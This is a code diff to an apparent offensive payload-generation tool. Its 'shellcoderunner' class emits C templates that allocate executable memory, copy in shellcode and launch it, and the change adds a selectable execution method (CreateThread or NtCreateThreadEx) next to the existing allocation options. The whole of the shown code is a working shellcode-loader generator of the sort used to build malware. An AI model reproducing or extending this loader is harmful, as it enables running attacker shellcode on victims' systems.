@@ -2,10 +2,13 @@ from string import Template
 
 class shellcoderunner:
     def __init__(self, arguments):
-        self.apicallsList = ['CreateThread', 'WaitForSingleObject', 'CloseHandle']
+        self.apicallsList = ['WaitForSingleObject', 'CloseHandle']
         self.allocation = 'VirtualAlloc'
+        self.execution = 'CreateThread'
         if 'allocation' in arguments:
             self.allocation = arguments['allocation']
+        if 'execution' in arguments:
+            self.execution = arguments['execution']
         if self.allocation == 'VirtualAlloc':
             self.allocationCode = """
     LPVOID buffer = {VirtualAlloc}(NULL, {shellcodeSize}, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
@@ -33,6 +36,17 @@ class shellcoderunner:
     {VirtualFree}(buffer, 0, MEM_RELEASE);
 """
             self.apicallsList += ['NtAllocateVirtualMemory', 'VirtualFree']
+        if self.execution == 'CreateThread':
+            self.executionCode = """
+    HANDLE hThread = {CreateThread}(NULL, 0, (LPTHREAD_START_ROUTINE)buffer, NULL, 0, NULL);
+"""
+            self.apicallsList += ['CreateThread']
+        elif self.execution == 'NtCreateThreadEx':
+            self.executionCode = """
+    HANDLE hThread;
+    {NtCreateThreadEx}(&hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, (LPTHREAD_START_ROUTINE)buffer, NULL, FALSE, 0, 0, 0, NULL);
+"""
+            self.apicallsList += ['NtCreateThreadEx']
 
     def imports(self) -> list[str]:
         return ["#include <windows.h>", 
@@ -59,7 +73,7 @@ class shellcoderunner:
 
 
     // Create thread to run shellcode
-    HANDLE hThread = {CreateThread}(NULL, 0, (LPTHREAD_START_ROUTINE)buffer, NULL, 0, NULL);
+    $execution
 
     // Wait for thread to finish
     {WaitForSingleObject}(hThread, INFINITE);
@@ -67,4 +81,4 @@ class shellcoderunner:
 
     // Clean up by freeing the memory we allocated for our shellcode
     $free
-""").substitute(allocation=self.allocationCode, free=self.freeCode)
+""").substitute(allocation=self.allocationCode, free=self.freeCode, execution=self.executionCode)
